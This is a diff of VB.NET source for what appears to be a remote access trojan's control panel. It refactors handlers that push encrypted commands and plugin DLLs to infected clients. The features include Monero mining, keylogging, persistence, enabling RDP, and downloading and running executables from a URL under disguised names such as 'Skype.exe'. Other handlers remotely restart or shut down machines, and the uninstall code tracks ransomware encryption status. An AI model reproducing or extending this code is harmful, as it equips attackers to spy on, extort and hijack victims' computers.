-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\CRYP.dll"))))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\CRYP.dll")))
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub XMRMinerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XMRMinerToolStripMenuItem.Click
+    Private Sub XMRMinerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XMRMinerToolStripMenuItem.Click
         Try
             If L1.SelectedItems.Count > 0 Then
                 Dim miner As New XMR
                 miner.ShowDialog()
-                Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+                Dim MS As New IO.MemoryStream
+                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                 Dim F = Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\XMR.dll"))
-                Dim CMD As Byte() = Nothing
+                Dim CMD As Byte()
                 If miner.C = True Then
                     CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cus + "|'P'|" + "x" + "|'P'|" + "x" + "|'P'|" + "x" + "|'P'|" + F))
                 Else
                     CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cpu + "|'P'|" + miner.url + "|'P'|" + miner.user + "|'P'|" + miner.pass + "|'P'|" + F))
                 End If
-                Dim M As New IO.MemoryStream
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                Dim Kill As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|"))
-                Dim MM As New IO.MemoryStream
-                Await MM.WriteAsync(Kill, 0, Kill.Length)
-                Await MM.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
+                MS.Write(CMD, 0, CMD.Length)
 
                 For Each x As ListViewItem In L1.SelectedItems
-                    Dim CL As S_Client = CType(x.Tag, S_Client)
                     If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                         If miner.OK = True AndAlso miner.K = False Then
-                            x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
+                            S.SendData(x.Tag, MS.ToArray)
                         ElseIf miner.K = True Then
+                            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|")
                             x.BackColor = Color.DarkSlateGray
-                            CL.Send(MM.ToArray)
                         End If
                     End If
                 Next
-
-                Try
-                    Await M.FlushAsync
-                    Await MM.FlushAsync
-                    M.Dispose()
-                    MM.Dispose()
-                Catch ex As Exception
-                End Try
+                MS.Dispose()
             End If
-
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
@@ -865,29 +1608,15 @@ Public Class Main
         Floods.Show()
     End Sub
 
-    Private Async Sub EnableWindowsRDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableWindowsRDPToolStripMenuItem.Click
+    Private Sub EnableWindowsRDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableWindowsRDPToolStripMenuItem.Click
         Try
-            'Messages("Enable Remote Desktop", "Client must be running as Admin and using router that support UPNP")
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\WRDP.dll"), True)) + SPL + " "))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    Dim CL As S_Client = CType(x.Tag, S_Client)
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            Messages("Enable Remote Desktop", "Client must be running as Admin and using router that support UPNP")
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\WRDP.dll"), True)) + SPL + " ")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
@@ -897,84 +1626,42 @@ Public Class Main
 #End Region
 
 #Region "PC Options"
-    Private Async Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
+    Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        CL.Send(M.ToArray)
-                        x.BackColor = Color.DarkSlateGray
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
+    Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|2"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        CL.Send(M.ToArray)
-                        x.BackColor = Color.DarkSlateGray
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|2")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
+    Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|3"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        CL.Send(M.ToArray)
-                        x.BackColor = Color.DarkSlateGray
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|3")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
@@ -985,131 +1672,48 @@ Public Class Main
 #End Region
 
 #Region "Client Options"
-    Private Async Sub UpdateDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateDiskToolStripMenuItem.Click
+    Private Sub UpdateDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateDiskToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim o As New OpenFileDialog
+            Dim o As New OpenFileDialog
             With o
                 .Filter = ".exe (*.exe)|*.exe"
                 .Title = "UPDATE"
             End With
 
-                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                    Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
-                    Dim F = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(o.FileName), True))
-                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
-                    Dim M As New IO.MemoryStream
-                    Await M.WriteAsync(CMD, 0, CMD.Length)
-                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                    For Each x As ListViewItem In L1.SelectedItems
-                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                            Dim CL As S_Client = CType(x.Tag, S_Client)
-                            x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
-                        End If
-                    Next
-
-                    Try
-                        Await M.FlushAsync
-                        M.Dispose()
-                    Catch ex As Exception
-                    End Try
-                End If
-            End If
-        Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Critical)
-            Exit Sub
-        End Try
-    End Sub
-
-    Private Async Sub UpdateFromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateFromURLToolStripMenuItem.Click
-        Try
-            If L1.Items.Count > 0 Then
-                Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
-                Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
-                Dim M As New IO.MemoryStream
-
-                If String.IsNullOrEmpty(URL) Then
-                    Exit Sub
-                Else
-
-                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "5" + "|'P'|" + URL + "|'P'|" + EXE))
-                    Await M.WriteAsync(CMD, 0, CMD.Length)
-                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                    For Each x As ListViewItem In L1.SelectedItems
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                            x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
-                        End If
-                    Next
-                End If
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
-        Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Critical)
-            Exit Sub
-        End Try
-    End Sub
-
-    Private Async Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
-        Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|2"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
+            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                Dim MS As New IO.MemoryStream
+                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+                Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True))
+                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
+                MS.Write(CMD, 0, CMD.Length)
                 For Each x As ListViewItem In L1.SelectedItems
                     If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
+                        S.SendData(x.Tag, MS.ToArray)
                         x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
                     End If
                 Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
+                MS.Dispose()
             End If
-
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
+    Private Sub UpdateFromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateFromURLToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|1"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
+            Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
+            Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
 
+            If String.IsNullOrEmpty(URL) Then
+                Exit Sub
+            Else
                 For Each x As ListViewItem In L1.SelectedItems
                     If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "5" + "|'P'|" + URL + "|'P'|" + EXE)
                         x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
                     End If
                 Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-
             End If
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1117,37 +1721,51 @@ Public Class Main
         End Try
     End Sub
 
-    Private Async Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
+    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim result As DialogResult
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3"))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|2")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
 
-                For Each x As ListViewItem In L1.SelectedItems
-                    Dim CL As S_Client = CType(x.Tag, S_Client)
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
-                            result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
-                            If result = DialogResult.Yes Then
-                                x.BackColor = Color.DarkSlateGray
-                                CL.Send(M.ToArray)
-                            End If
-                        Else
+    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|1")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
+        Try
+            Dim result As DialogResult
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
+                        result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
+                        If result = DialogResult.Yes Then
+                            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
                             x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
                         End If
+                    Else
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
+                        x.BackColor = Color.DarkSlateGray
                     End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
@@ -1159,195 +1777,114 @@ Public Class Main
 
 #Region "Others"
 
-    Private Async Sub PersistenceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PersistenceToolStripMenuItem.Click
+    Private Sub PersistenceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PersistenceToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " "))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " ")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
+    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim M As New IO.MemoryStream
-                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + " "))
-                Await M.WriteAsync(CMD, 0, CMD.Length)
-                Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                For Each x As ListViewItem In L1.SelectedItems
-                    Dim KL As Keylogger = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
-                    If KL Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                        Dim CL As S_Client = CType(x.Tag, S_Client)
-                        x.BackColor = Color.DarkSlateGray
-                        CL.Send(M.ToArray)
-                    End If
-                Next
-
-                Try
-                    Await M.FlushAsync
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-            End If
+            For Each x As ListViewItem In L1.SelectedItems
+                Dim KL As Keylogger = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
+                If KL Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + " ")
+                    x.BackColor = Color.DarkSlateGray
+                End If
+            Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
             Exit Sub
         End Try
     End Sub
 
-    Private Async Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
+    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
         Try
-            If L1.Items.Count > 0 Then
-                Dim o As New OpenFileDialog
+            Dim o As New OpenFileDialog
             With o
                 .Title = "RUN"
             End With
 
-                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                    Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
-                    Dim F = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(o.FileName), True))
-                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt(("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F)))
-                    Dim M As New IO.MemoryStream
-                    Await M.WriteAsync(CMD, 0, CMD.Length)
-                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                    For Each x As ListViewItem In L1.SelectedItems
-                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                            Dim CL As S_Client = CType(x.Tag, S_Client)
-                            x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
-                        End If
-                    Next
-
-                    Try
-                        Await M.FlushAsync
-                        M.Dispose()
-                    Catch ex As Exception
-                    End Try
-                End If
-            End If
-        Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Critical)
-            Exit Sub
-        End Try
-    End Sub
-
-    Private Async Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
-        Try
-            If L1.Items.Count > 0 Then
-                Dim URL As String = InputBox("Enter the direct link", "Run File", "http: //site.com/file.exe")
-            Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")
-
-                If String.IsNullOrEmpty(URL) Then
-                    Exit Sub
-                Else
-                    Dim M As New IO.MemoryStream
-                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL.ToString + "|'P'|" + EXE.ToString))
-                    Await M.WriteAsync(CMD, 0, CMD.Length)
-                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                    For Each x As ListViewItem In L1.SelectedItems
-                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                            Dim CL As S_Client = CType(x.Tag, S_Client)
-                            x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
-                        End If
-                    Next
-
-                    Try
-                        Await M.FlushAsync
-                        M.Dispose()
-                    Catch ex As Exception
-                    End Try
-                End If
-            End If
-
-        Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Critical)
-            Exit Sub
-        End Try
-    End Sub
-
-    Private Async Sub VisitWebsiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisitWebsiteToolStripMenuItem.Click
-        Try
-            If L1.Items.Count > 0 Then
-                Dim URL As String = InputBox("Enter URL", "Visit URL", "http://google.com")
-
-                If String.IsNullOrEmpty(URL) Then
-                    Exit Sub
-                Else
-                    Dim M As New IO.MemoryStream
-                    Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "Visit|'P'|" + URL))
-                    Await M.WriteAsync(CMD, 0, CMD.Length)
-                    Await M.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)
-
-                    If Not URL.StartsWith("http") Then
-                        URL = "http://" + URL
-                    End If
-                    For Each x As ListViewItem In L1.SelectedItems
-                        If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
-                            Dim CL As S_Client = CType(x.Tag, S_Client)
-                            x.BackColor = Color.DarkSlateGray
-                            CL.Send(M.ToArray)
-                        End If
-                    Next
-
-                    Try
-                        Await M.FlushAsync
-                        M.Dispose()
-                    Catch ex As Exception
-                    End Try
-                End If
-            End If
-        Catch ex As Exception
-            MsgBox(ex.Message, MsgBoxStyle.Critical)
-            Exit Sub
-        End Try
-    End Sub
-
-    Private Async Sub RunAsAdministratorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsAdministratorToolStripMenuItem.Click
-        Try
